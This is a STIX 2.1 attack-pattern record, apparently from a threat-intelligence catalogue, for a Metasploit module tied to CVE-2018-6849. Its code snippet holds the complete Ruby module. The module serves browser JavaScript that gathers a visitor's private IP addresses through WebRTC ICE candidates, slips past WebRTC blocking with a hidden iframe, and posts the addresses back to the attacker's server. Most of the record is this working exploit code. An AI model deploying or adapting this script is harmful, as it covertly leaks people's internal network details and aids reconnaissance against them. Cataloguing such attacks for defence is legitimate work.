{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5e267b6a-2b6f-43f1-95d0-abb2e92c5280",
    "created": "2024-08-14T16:32:17.844996Z",
    "modified": "2024-08-14T16:32:17.844999Z",
    "name": "HTTP Client LAN IP Address Gather",
    "description": "( This module retrieves a browser's network interface IP addresses using WebRTC. ) 'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/browser_lanipleak.rb",
            "external_id": "browser_lanipleak.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-6849"
        },
        {
            "source_name": "reference",
            "url": "http://net.ipcalf.com/"
        },
        {
            "source_name": "reference",
            "url": "https://www.inputzero.io/p/private-ip-leakage-using-webrtc.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpServer\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'           => 'HTTP Client LAN IP Address Gather',\n        'Description'    => %q(\n          This module retrieves a browser's network interface IP addresses\n          using WebRTC.\n        ),\n        'License'        => MSF_LICENSE,\n        'Author'         => [\n          'Daniel Roesler', # JS Code\n          'Dhiraj Mishra'   # MSF Module\n         ],\n        'References'     => [\n           [ 'CVE', '2018-6849' ],\n           [ 'URL', 'http://net.ipcalf.com/' ],\n           [ 'URL', 'https://www.inputzero.io/p/private-ip-leakage-using-webrtc.html' ]\n         ],\n        'DisclosureDate' => '2013-09-05',\n        'Actions'        => [[ 'WebServer', 'Description' => 'Serve exploit via web server' ]],\n        'PassiveActions' => [ 'WebServer' ],\n        'DefaultAction'  => 'WebServer'\n      )\n    )\n  end\n\n  def run\n    exploit # start http server\n  end\n\n  def setup\n     # code from: https://github.com/diafygi/webrtc-ips\n     @html = <<-JS\n<script>\n//get the IP addresses associated with an account\nfunction getIPs(callback){\n    var ip_dups = {};\n\n    //compatibility for firefox and chrome\n    var RTCPeerConnection = window.RTCPeerConnection\n        || window.mozRTCPeerConnection\n        || window.webkitRTCPeerConnection;\n    var useWebKit = !!window.webkitRTCPeerConnection;\n\n    //bypass naive webrtc blocking using an iframe\n    if(!RTCPeerConnection){\n        //NOTE: you need to have an iframe in the page right above the script tag\n        //\n        //<iframe id=\"iframe\" sandbox=\"allow-same-origin\" style=\"display: none\"></iframe>\n        //<script>...getIPs called in here...\n        //\n        var win = iframe.contentWindow;\n        RTCPeerConnection = win.RTCPeerConnection\n            || win.mozRTCPeerConnection\n            || win.webkitRTCPeerConnection;\n        useWebKit = !!win.webkitRTCPeerConnection;\n    }\n\n    //minimal requirements for data connection\n    var mediaConstraints = {\n        optional: [{RtpDataChannels: true}]\n    };\n\n    var servers = {iceServers: [{urls: \"stun:stun.services.mozilla.com\"}]};\n\n    //construct a new RTCPeerConnection\n    var pc = new RTCPeerConnection(servers, mediaConstraints);\n\n    function handleCandidate(candidate){\n        //match just the IP address\n        var ip_regex = /([0-9]{1,3}(\\\\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/\n        var ip_addr = ip_regex.exec(candidate)[1];\n\n        //remove duplicates\n        if(ip_dups[ip_addr] === undefined)\n            callback(ip_addr);\n\n        ip_dups[ip_addr] = true;\n    }\n\n    //listen for candidate events\n    pc.onicecandidate = function(ice){\n\n        //skip non-candidate events\n        if(ice.candidate)\n            handleCandidate(ice.candidate.candidate);\n    };\n\n    //create a bogus data channel\n    pc.createDataChannel(\"\");\n\n    //create an offer sdp\n    pc.createOffer(function(result){\n\n        //trigger the stun server request\n        pc.setLocalDescription(result, function(){}, function(){});\n\n    }, function(){});\n\n    //wait for a while to let everything done\n    setTimeout(function(){\n        //read candidate info from local description\n        var lines = pc.localDescription.sdp.split('\\\\n');\n\n        lines.forEach(function(line){\n            if(line.indexOf('a=candidate:') === 0)\n                handleCandidate(line);\n        });\n    }, 1000);\n}\n\ngetIPs(function(ip){\n  //console.log(ip);\n  var xmlhttp = new XMLHttpRequest;\n  xmlhttp.open('POST', window.location, true);\n  xmlhttp.send(ip);\n});\n</script>\n     JS\n  end\n\n  def on_request_uri(cli, request)\n    case request.method.downcase\n    when 'get'\n      print_status(\"#{cli.peerhost}: Sending response (#{@html.size} bytes)\")\n      send_response(cli, @html)\n    when 'post'\n      begin\n        ip = request.body\n        if ip =~ /\\A([0-9]{1,3}(\\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})\\z/\n          print_good(\"#{cli.peerhost}: Found IP address: #{ip}\")\n        else\n          print_error(\"#{cli.peerhost}: Received malformed IP address\")\n        end\n      rescue\n        print_error(\"#{cli.peerhost}: Received malformed reply\")\n      end\n    else\n      print_error(\"#{cli.peerhost}: Unhandled method: #{request.method}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-09-05"
}